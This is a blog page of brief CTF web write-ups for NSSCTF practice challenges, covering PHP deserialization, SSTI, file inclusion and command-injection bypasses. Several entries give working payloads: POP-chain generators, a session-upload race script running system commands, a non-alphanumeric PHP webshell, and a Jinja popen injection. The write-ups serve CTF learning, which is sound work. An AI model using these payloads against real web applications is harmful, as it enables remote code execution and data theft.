
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>NSS刷web3 | Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>NSS刷web3</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/8/2
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            
            <span class="tag">
                
                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
            </span>
            
            <span class="tag">
                
                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h1 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster<img src="https://img-blog.csdnimg.cn/8b1fb6bdc01b4951bb36f01d09ee4ea1.png" alt="在这里插入图片描述"></h1><h1 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h1><p>这题会匹配A或B类<br>如 <code>&quot;A&quot;:1:</code><br>绕不过去 可以考虑快速析构</p>
<pre><code class="c">&lt;?php
class A&#123;
    public $code = &quot;&quot;;
    function __call($method,$args)&#123;
        eval($this-&gt;code);
        
    &#125;
    function __wakeup()&#123;
        $this-&gt;code = &quot;&quot;;
    &#125;
&#125;

class B&#123;
    public $a;
    function __destruct()&#123;
        echo $this-&gt;a-&gt;a();
    &#125;
&#125;
$A = new A();
$poc = new B();
$poc -&gt; a = $A;
$A -&gt;code = &#39;phpinfo();&#39;;
echo serialize($poc);

// if(isset($_REQUEST[&#39;poc&#39;]))&#123;
//     preg_match_all(&#39;/&quot;[BA]&quot;:(.*?):/s&#39;,$_REQUEST[&#39;poc&#39;],$ret);
//     if (isset($ret[1])) &#123;
//         foreach ($ret[1] as $i) &#123;
//             if(intval($i)!==1)&#123;
//                 exit(&quot;you want to bypass wakeup ? no !&quot;);
//             &#125;
//         &#125;
//         unserialize($_REQUEST[&#39;poc&#39;]);    
//     &#125;


// &#125;
</code></pre>
<p>生成的序列化字符串手动删除最后一个花括号<br>然后试了一下<code>system</code>不能用 应该是进disable_functions了<br><img src="https://img-blog.csdnimg.cn/94758239f870438596c44fe299a450a9.png" alt="在这里插入图片描述"><br>那直接上蚁剑用插件绕<br><img src="https://img-blog.csdnimg.cn/a03ba83d3ef740dba28cfdcf944a55bc.png" alt="在这里插入图片描述"></p>
<h1 id="GDOUCTF-2023-受不了一点"><a href="#GDOUCTF-2023-受不了一点" class="headerlink" title="[GDOUCTF 2023]受不了一点"></a>[GDOUCTF 2023]受不了一点</h1><p><img src="https://img-blog.csdnimg.cn/929fbdef67c148f9bc82d3b409b46620.png" alt="在这里插入图片描述"></p>
<h1 id="HNCTF-2022-Week1-easy-html"><a href="#HNCTF-2022-Week1-easy-html" class="headerlink" title="[HNCTF 2022 Week1]easy_html"></a>[HNCTF 2022 Week1]easy_html</h1><p><img src="https://img-blog.csdnimg.cn/40a6fc60e7414f7da9ccbf337037c400.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5473c604e4584b2cbdaf2d6c5b9eb705.png" alt="在这里插入图片描述"></p>
<h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><pre><code class="bash">?code=`l&#39;&#39;s /&gt;1`;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/a6ef59115d454ef69384a6f2e6919a99.png" alt="在这里插入图片描述"></p>
<pre><code class="lua">?code=`t&#39;&#39;ac  /fffffffffflagafag&gt;1`;
</code></pre>
<h1 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h1><p>Ginkgo传base64加密的payload<br>然后发现不能用<code>system</code> 看看<code>disable_functions</code><br><img src="https://img-blog.csdnimg.cn/04c33911437748b2a8c620e374c496b5.png" alt="在这里插入图片描述"><br>拿蚁剑绕<br><img src="https://img-blog.csdnimg.cn/51dbd3a264a04045ac815322c0d59b65.png" alt="在这里插入图片描述"><br>其中base64解码后是 <code>eval($_POST[1]);</code><br><img src="https://img-blog.csdnimg.cn/0eadf36f8b0749b29df08bed36b8a3a6.png" alt="在这里插入图片描述"><br>多试几个 我不知道最终成的是那个</p>
<h1 id="SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1><p>先读flag.php<br>说在根目录<br><img src="https://img-blog.csdnimg.cn/0149137a4b6c42a68e70f661e489dd86.png" alt="在这里插入图片描述"></p>
<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><p>session包含 条件竞争<br>早jb忘了 有空重新看一下 这里直接用脚本了</p>
<pre><code class="python">import io
import requests
from threading import Thread

url = &#39;http://node4.anna.nssctf.cn:28944&#39;
session_id = &#39;a&#39;


def POST(session):
    file = io.BytesIO(b&#39;a&#39; * 1024 * 5)
    times = 0
    while True:
        session.post(url=url,
                     data=&#123;
                         &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#39;cat /nssctfasdasdflag&#39;);echo md5(&#39;1&#39;);?&gt;&quot;&#125;,
                     cookies=&#123;&#39;PHPSESSID&#39;: session_id&#125;,
                     files=&#123;&quot;file&quot;: (&#39;a.txt&#39;, file)&#125;,
                     )
        print(f&#39;上传文件&#123;times&#125;&#39;)
        times += 1


def GET(session):
    geturl = url + f&#39;?file=/tmp/sess_&#123;session_id&#125;&#39;
    print(geturl)
    while True:
        response = session.get(url=geturl)
        if &#39;c4ca4238a0b923820dcc509a6f75849b&#39; in response.text:
            print(response.text)
            break
        else:
            print(&#39;[+]retry-----&#39;)


if __name__ == &#39;__main__&#39;:
    with requests.session() as session:
        t1 = Thread(target=POST, args=(session,))
        t1.daemon = True
        t1.start()
        GET(session)
</code></pre>
<h1 id="HNCTF-2022-Week1-easy-upload"><a href="#HNCTF-2022-Week1-easy-upload" class="headerlink" title="[HNCTF 2022 Week1]easy_upload"></a>[HNCTF 2022 Week1]easy_upload</h1><p>直接传一句话就进去了</p>
<p><img src="https://img-blog.csdnimg.cn/20a6155dfa7f4d93a0613c9575bf3199.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h1><p>ffifdyop<br><img src="https://img-blog.csdnimg.cn/20ecb8df280041f1b8cf1b6573f769c7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b2bebaadaa5b4e8b91f94a3ede2faaf8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/faf56fc4d8f34e0b91b6556651722f5f.png" alt="在这里插入图片描述"></p>
<h1 id="HNCTF-2022-Week1-What-is-Web"><a href="#HNCTF-2022-Week1-What-is-Web" class="headerlink" title="[HNCTF 2022 Week1]What is Web"></a>[HNCTF 2022 Week1]What is Web</h1><p><img src="https://img-blog.csdnimg.cn/1bba48f64e1d42beb7c5eae14dede115.png" alt="在这里插入图片描述"></p>
<h1 id="NISACTF-2022-is-secret"><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret<img src="https://img-blog.csdnimg.cn/51927d7ea6734b9ca35f32e8ed180b08.png" alt="在这里插入图片描述"></h1><p>RC4是对称密码 这里给key了<br><img src="https://img-blog.csdnimg.cn/c8c0e388b8744ac298d14e26144eecf2.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/1653c0ac0015470e9e4b32aa134e5771.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fa710c98fab044cdb657769c60c7669c.png" alt="| 和 read 都不能用"><br><code>&#123;&#123;lipsum.__globals__.os.popen('cat /f*')['re''ad']()&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/08fdfa58b8f143ee84531f18851d49fd.png" alt="在这里插入图片描述"></p>
<h1 id="WUSTCTF-2020-朴实无华"><a href="#WUSTCTF-2020-朴实无华" class="headerlink" title="[WUSTCTF 2020]朴实无华"></a>[WUSTCTF 2020]朴实无华</h1><p><img src="https://img-blog.csdnimg.cn/a8dea9c2f3774028817977cf83b735ea.png" alt="在这里插入图片描述"></p>
<h1 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h1><p><img src="https://img-blog.csdnimg.cn/a5a7e0f839324539840be82eed35fcc3.png" alt="在这里插入图片描述"><br>离谱正则 考虑绕正则回溯次数绕过</p>
<pre><code class="lua">import requests
payload = &#39;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#39; + &quot;@&quot;*(1000000) + &#39;&quot;&#125;&#39;
res = requests.post(&quot;http://node4.anna.nssctf.cn:28625/&quot;,
                    data=&#123;&quot;letter&quot;: payload&#125;)
print(res.text)
</code></pre>
<h1 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h1><p>session伪造 key是猜的 这题没什么道理<br><img src="https://img-blog.csdnimg.cn/8ff8332a6a544bcd955d28309be06ad0.png" alt="在这里插入图片描述"></p>
<h1 id="HNCTF-2022-Week1-Interesting-http"><a href="#HNCTF-2022-Week1-Interesting-http" class="headerlink" title="[HNCTF 2022 Week1]Interesting_http"></a>[HNCTF 2022 Week1]Interesting_http</h1><p>post 传 want&#x3D;flag<br>cookie改admin<br>XFF改本地</p>
<h1 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h1><p><img src="https://img-blog.csdnimg.cn/7b98d874405d46c6a9663a85ce8a9b9e.png" alt="在这里插入图片描述"></p>
<p>callUserFunc对大小写不敏感<img src="https://img-blog.csdnimg.cn/0d28c6054615425f9876074cc92c102b.png" alt="在这里插入图片描述"><br>改NSS2然后查看源码</p>
<h1 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h1><p>登录处存在sql注入<br>database被ban了</p>
<p>通过不存在的方法来得到数据库名<br>然后extractvalue没给ban<br><img src="https://img-blog.csdnimg.cn/b667447558124723afeee8b03bbe5b43.png" alt="在这里插入图片描述"><br>然后在查列名的时候发现column被ban了<br>题目叫join-us 很容易能想到用<code>join</code>无列名注入</p>
<p><img src="https://img-blog.csdnimg.cn/44c2c5e46c934d0ca12f859a1f39e7cd.png" alt="在这里插入图片描述"></p>
<h1 id="HUBUCTF-2022-新生赛-HowToGetShell"><a href="#HUBUCTF-2022-新生赛-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 新生赛]HowToGetShell"></a>[HUBUCTF 2022 新生赛]HowToGetShell</h1><p><img src="https://img-blog.csdnimg.cn/faaddab264204836ae9ae54502af1bd3.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-1z-unserialize"><a href="#SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]1z_unserialize"></a>[SWPUCTF 2022 新生赛]1z_unserialize</h1><pre><code class="php">&lt;?php
 
class lyh&#123;
    public $lt;
    public $lly;
     
     function  __destruct()
     &#123;
        $a = $this-&gt;lt;

        $a($this-&gt;lly);
     &#125;
    
    
&#125;
$poc = new lyh();
$poc-&gt;lt = &quot;system&quot;;
$poc-&gt;lly = &quot;tac /f*&quot;;
echo serialize($poc);
</code></pre>
<p><code>nss=O:3:&quot;lyh&quot;:2:&#123;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:7:&quot;tac /f*&quot;;&#125;</code></p>
<h1 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h1><p><img src="https://img-blog.csdnimg.cn/0211570563784f82b19d3636aa0949bb.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h1><p><img src="https://img-blog.csdnimg.cn/cc24c7a29711413992ce39ca1fef7dc4.png" alt="在这里插入图片描述"><br><code>$_=[];$_=@&quot;$_&quot;;$_=$_[&#39;!&#39;==&#39;@&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></p>
<p>assert($POST[_]);<br>因为是get 记得url编码<br>这里发现直接执行命令不行 通过phpinfo得知很多命令都ban了 那么还是考虑写个shell 用蚁剑绕<br><img src="https://img-blog.csdnimg.cn/b108ba97875448c78fd02205e3f366da.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-where-am-i"><a href="#SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="[SWPUCTF 2022 新生赛]where_am_i"></a>[SWPUCTF 2022 新生赛]where_am_i</h1><p>没头绪<br>看评论说是社工<br>那么应该是要电话号码<br>百度搜图得知 该地点是<code>山水间·古迹酒店</code>  <code>暑袜北一街145号</code><br><img src="https://img-blog.csdnimg.cn/dcb284d0cbaa4f6ebc235c495fe0e8b3.png" alt="在这里插入图片描述"><br>把括号删了输入就行</p>
<p>没写明白这题为什么在WEB里</p>
<h1 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h1><p>日志文件包含<br><img src="https://img-blog.csdnimg.cn/ec6c02b6c7f74f21b2bc1c2b42b4437b.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1><pre><code class="php">
&lt;?php
class X
&#123;
    public $x = __FILE__;
    function __construct($x)
    &#123;
        $this-&gt;x = $x;
    &#125;
    function __wakeup()
    &#123;
        if ($this-&gt;x !== __FILE__) &#123;
            $this-&gt;x = __FILE__;
        &#125;
    &#125;
    function __destruct()
    &#123;
        highlight_file($this-&gt;x);
        //flag is in fllllllag.php
    &#125;
&#125;

$p = new X(&quot;fllllllag.php&quot;);
echo serialize($p);
//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;
</code></pre>
<p>然后绕一下wakeup<br><code>O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125; </code><br><img src="https://img-blog.csdnimg.cn/39a5b58797a545cea1f26ba98cc14452.png" alt="在这里插入图片描述"></p>
<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><pre><code class="php">
&lt;?php
error_reporting(0);

// flag.php
class teacher
&#123;
    public $name;
    public $rank;
    private $salary;
    public function __construct($name, $rank, $salary = 10000)
    &#123;
        $this-&gt;name = $name;
        $this-&gt;rank = $rank;
        $this-&gt;salary = $salary;
    &#125;
&#125;

class classroom
&#123;
    public $name;
    public $leader;
    public function __construct($name, $leader)
    &#123;
        $this-&gt;name = $name;
        $this-&gt;leader = $leader;
    &#125;
    public function hahaha()
    &#123;
        if ($this-&gt;name != &#39;one class&#39; or $this-&gt;leader-&gt;name != &#39;ing&#39; or $this-&gt;leader-&gt;rank != &#39;department&#39;) &#123;
            return False;
        &#125; else &#123;
            return True;
        &#125;
    &#125;
&#125;

class school
&#123;
    public $department;
    public $headmaster;
    public function __construct($department, $ceo)
    &#123;
        $this-&gt;department = $department;
        $this-&gt;headmaster = $ceo;
    &#125;
    public function IPO()
    &#123;
        if ($this-&gt;headmaster == &#39;ong&#39;) &#123;
            echo &quot;Pretty Good ! Ctfer!\n&quot;;
            echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);
        &#125;
    &#125;
    public function __wakeup()
    &#123;
        if ($this-&gt;department-&gt;hahaha()) &#123;
            $this-&gt;IPO();
        &#125;
    &#125;
&#125;
$T = new teacher(&#39;ing&#39;, &#39;department&#39;);
$C = new classroom(&quot;one class&quot;, $T,);
$p = new school($C, &#39;ong&#39;);
echo base64_encode(serialize($p));
//Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9
</code></pre>
<p>利用点是new对象 这里我们考虑new原生类<br>注意<code>SplFileObject</code>是逐行读的 所以我们要用伪协议<br><img src="https://img-blog.csdnimg.cn/b03d3fd466d54fa6b0a14153494da260.png" alt="在这里插入图片描述"></p>
<h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>简单看了一下 应该是原生类找文件 然后用escape读<br><img src="https://img-blog.csdnimg.cn/f92b1d338ed14f6c96d37628d850cb27.png" alt="在这里插入图片描述"><br>先开个<code>GlobIterator</code>找flag</p>
<pre><code class="php">&lt;?php
error_reporting(0);

class catalogue
&#123;
    public $class;
    public $data;
    public function __construct($class, $data)
    &#123;
        $this-&gt;class = $class;
        $this-&gt;data = $data;
    &#125;
    public function __destruct()
    &#123;
        echo new $this-&gt;class($this-&gt;data);
    &#125;
&#125;

$p = new catalogue(&quot;GlobIterator&quot;, &quot;/*flag*&quot;);
echo serialize($p);
//O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:12:&quot;GlobIterator&quot;;s:4:&quot;data&quot;;s:7:&quot;/*flag*&quot;;&#125;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/a3430eca323947a3945f41a72d23362c.png" alt="在这里插入图片描述"></p>
<p>非预期 改16进制<br>这个点我第一次见<br>把小s改大写S 然后就可以用十六进制了<br><code>?cata=O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;\53\70\6c\46\69\6c\65\4f\62\6a\65\63\74&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code><br>预期是字符串逃逸<br><img src="https://img-blog.csdnimg.cn/36c48eb649a7445ea8340b49b9fb8b14.png" alt="在这里插入图片描述"></p>
<h1 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h1><p>要尝试构造字母 base_convert()可以任意进制转换<br>36进制构造phpinfo试试<br><img src="https://img-blog.csdnimg.cn/f02fc91ee1c04c2d9735249dfc16811f.png" alt="在这里插入图片描述"></p>
<p>然而phpinfo里没有flag<br>尝试了用system 读了一下当前目录 可以用<br>但是36进制又弄不出来空格之类的东西 读不了根目录<br>考虑到hex2bin函数 我们可以先构造hex2bin 然后就可以构造任意字符了<br>base_convert(37907361743,10,36)(dechex())<br><img src="https://img-blog.csdnimg.cn/0f6d36ac032745ee89f08a9ff64b1eef.png" alt="在这里插入图片描述"></p>
<p>最终payload<br><code>c=\$abs=base_convert(37907361743,10,36)(dechex(1598506324));(\$\$abs)&#123;1&#125;((\$\$abs)&#123;2&#125;)&amp;1=system&amp;2=cat \f*</code></p>
<h1 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h1><p><img src="https://img-blog.csdnimg.cn/1e21c85a08394d70b8ac06fc68f4f80e.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-xff"><a href="#SWPUCTF-2022-新生赛-xff" class="headerlink" title="[SWPUCTF 2022 新生赛]xff"></a>[SWPUCTF 2022 新生赛]xff</h1><p><img src="https://img-blog.csdnimg.cn/1c24527464e34d389cb9b6c8283ccd82.png" alt="在这里插入图片描述"></p>
<h1 id="SWPUCTF-2022-新生赛-js-sign"><a href="#SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="[SWPUCTF 2022 新生赛]js_sign"></a>[SWPUCTF 2022 新生赛]js_sign</h1><p><img src="https://img-blog.csdnimg.cn/8dd6e7a927124f4da0fe02c982ff061c.png" alt="在这里插入图片描述"><br>hint解码完是tapcode<br><img src="https://img-blog.csdnimg.cn/a20938f382fa47fdaebcd1c5976244f3.png" alt="在这里插入图片描述"><br>加括号里面转小写</p>
<h1 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h1><p>没环境了</p>
<h1 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h1><p>存在文件包含<br>日志文件包含给ban了<br>试试远程 也ban了<br>尝试伪协议读一下index.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);

if (isset($_GET[&#39;N_S.S&#39;])) &#123;
    eval($_GET[&#39;N_S.S&#39;]);
&#125;

if(!isset($_GET[&#39;file&#39;])) &#123;
    header(&#39;Location:/index.php?file=&#39;);
&#125; else &#123;
    $file = $_GET[&#39;file&#39;];

    if (!preg_match(&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) &#123;
        include $file;
    &#125; else &#123;
        die(&#39;error.&#39;);
    &#125;
&#125;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/de5dc5503b864ee9a44f056b81743374.png" alt="在这里插入图片描述"></p>

    </div>
    
    
    
    
    
    
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
    




    
</body>
</html>
